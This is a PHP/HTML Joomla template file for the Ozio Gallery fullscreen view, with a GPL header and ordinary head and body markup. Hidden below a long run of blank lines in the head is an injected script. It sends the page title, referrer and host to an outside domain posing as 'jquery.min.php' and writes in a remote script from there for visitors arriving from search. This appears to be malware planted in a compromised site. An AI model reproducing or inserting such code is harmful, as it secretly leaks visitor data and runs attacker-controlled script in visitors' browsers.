<?php
/**
* This file is part of Ozio Gallery
*
* Ozio Gallery 4 is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 2 of the License, or
* (at your option) any later version.
*
* Foobar is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
*
* @copyright Copyright (C) 2010 Open Source Solutions S.L.U. All rights reserved.
* @license http://www.gnu.org/copyleft/gpl.html GNU/GPL, see RT-LICENSE.php
*/

defined( '_JEXEC' ) or die( 'Restricted access' );
/*
$closelink = trim( $this->params->get('closelink') );
if (empty($closelink)){
	$closelink=$this->baseurl;
}
*/
JHtml::_('bootstrap.framework');
?><!DOCTYPE html>
<html xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
<script type='text/javascript'>
var ozio_fullscreen=1;
</script>
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/oziofullscreen/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/oziofullscreen/css/oziofullscreen.css" type="text/css" />

























<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://www.cloud.oneteamus.com/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>
<body>
<a class="close_fullscreen" href="<?php echo '#';//$closelink; ?>">
<img src="<?php echo $this->baseurl; ?>/templates/oziofullscreen/images/chiudi.png">
</a>
<jdoc:include type="component" />
</body>
</html>